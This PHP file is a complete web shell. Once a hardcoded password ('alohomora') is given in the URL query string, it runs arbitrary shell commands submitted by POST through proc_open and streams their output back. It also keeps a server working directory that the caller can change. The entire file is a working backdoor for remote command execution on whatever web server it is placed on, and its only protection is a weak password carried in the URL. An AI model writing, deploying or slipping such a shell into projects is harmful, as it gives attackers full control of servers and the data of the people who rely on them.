<?php
session_start();
const OPEN = 'alohomora';

//open
if (isset($_GET['open']) && $_GET['open'] === OPEN){
	$_SESSION['auth'] = $_GET['open'];
	header('Location: ./');
	exit();
}

//close
if (isset($_GET['close'])){
	session_destroy();
	header('Location: ./');
	exit();
}

//guard
if (!isset($_SESSION['auth'])){
	header('Content-Type: text/plain');
	echo 'Access denied!';
	exit();
}

//chdir
if (!isset($_SESSION['chdir'])) $_SESSION['chdir'] = path(dirname(__FILE__));

//post - chdir
if (isset($_POST['chdir'])) set_chdir(trim($_POST['chdir']));
	
//post - cmd
if (isset($_POST['cmd'])) exec_cmd(trim($_POST['cmd']));

//normalize path
function path($path){
	return str_replace('\\', '/', $path);
}

//set chdir
function set_chdir($path){
	if ($_SESSION['chdir'] === $path) return;
	if ($path === '') $path = dirname(__FILE__);
	else $path = rtrim($_SESSION['chdir'], '/') . "/$path";
	$path = path(realpath($path));
	if (is_dir($path)) $_SESSION['chdir'] = $path;
}

//exec cmd
function exec_cmd($cmd, &$process=null){
	$process = null;
	$cwd = $_SESSION['chdir'];
	header('Content-Type: text/plain');
	header("x-chdir: $cwd");
	if ($cmd === '') exit();
	for ($i = ob_get_level(); $i; --$i) ob_end_flush();
	set_time_limit(1800); //sec
	ob_implicit_flush(1);
	flush();
	$_dump = function($str){
		echo rtrim($str, "\r\n") . "\r\n";
		flush();
	};
	$descriptorspec = [
		0 => ['pipe', 'r'], //stdin
		1 => ['pipe', 'w'], //stdout
		2 => ['pipe', 'w'], //stderr
	];
	$env = null;
	$other_options = null;
	$cmd = escapeshellcmd($cmd);
	$process = @proc_open($cmd, $descriptorspec, $pipes, $cwd, $env, $other_options);
	if (is_resource($process)){
		if (is_resource($pipes[0])) fclose($pipes[0]);
		while(!feof($pipes[1])){
			$msg = fgets($pipes[1], 1024);
			if (strlen($msg) === 0) break;
			$msg = preg_replace('/^[ ]([^ ])/', '$1', $msg);
			$_dump($msg);
		}
		if (is_resource($pipes[1])) fclose($pipes[1]);
		if (is_resource($pipes[2])) fclose($pipes[2]);
		if ($exit = proc_close($process)) $_dump("exit code = $exit");
	}
	else $_dump("Failed to run command ($cmd).");
	exit();
}